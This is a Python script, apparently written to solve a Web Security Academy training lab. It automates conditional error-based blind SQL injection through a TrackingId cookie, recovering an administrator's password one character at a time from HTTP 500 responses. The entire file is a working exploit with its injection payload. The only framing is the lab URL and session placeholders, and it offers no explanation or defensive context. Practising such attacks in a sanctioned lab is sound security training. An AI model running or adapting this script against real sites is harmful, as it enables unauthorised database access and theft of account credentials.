# BLIND-SQL-INJECTION-CONDITION-Error
import requests
import string

# === YOUR LAB INFO ===
url = "https://0a990042032b3c0580101290003200fe.web-security-academy.net/"
tracking_id = "auo0nLp9ldN2nBld"
session_id = "0SgbCK4Ol3Pvdv3zlYvTOY6J0yF21VLF"

charset = string.ascii_lowercase + string.digits
password = ""

print("[*] Starting conditional error-based SQLi...")

for pos in range(1, 21):  # Password is 20 characters
    for char in charset:
        payload = (
            tracking_id +
            "'||(SELECT CASE WHEN SUBSTR(password,{pos},1)='{char}' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'"
        ).format(pos=pos, char=char)

        cookies = {
            "TrackingId": payload,
            "session": session_id
        }

        response = requests.get(url, cookies=cookies)

        if response.status_code == 500:
            password += char
            print(f"[+] Position {pos}: {char} → Password so far: {password}")
            break
        else:
            print(f"[-] Tried {char} at position {pos} → no error")

print("\n✅ DONE! Final password:")
print(password)
